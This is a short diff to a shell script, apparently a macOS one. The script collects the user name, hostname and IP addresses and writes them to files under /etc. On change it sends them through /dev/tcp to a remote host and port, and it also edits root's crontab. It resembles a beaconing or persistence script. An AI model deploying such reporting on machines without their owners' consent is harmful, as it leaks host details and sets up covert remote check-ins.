@@ -10,8 +10,6 @@ hostname=$(hostname)
 # Linux's hostname -I doesn't work on Macs
 ip=$(/sbin/ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | paste -sd ',' -)
 
-info="$user $hostname $ip"
-
 ip_new=false
 if ! grep -q "^$ip$" /etc/ips; then
     echo "$ip" >> /etc/ips
@@ -20,7 +18,7 @@ fi
 
 if [[ $(< /etc/info) != "$user $hostname" || $ip_new = true ]]; then
     printf "$user $hostname" > /etc/info
-    printf "UPDATE: $info" >/dev/tcp/$host/$up_port
+    printf "UPDATE: $user $hostname $ip" >/dev/tcp/$host/$up_port
 fi
 
 grep -v "$host" /var/at/tabs/root > /tmp/crontab
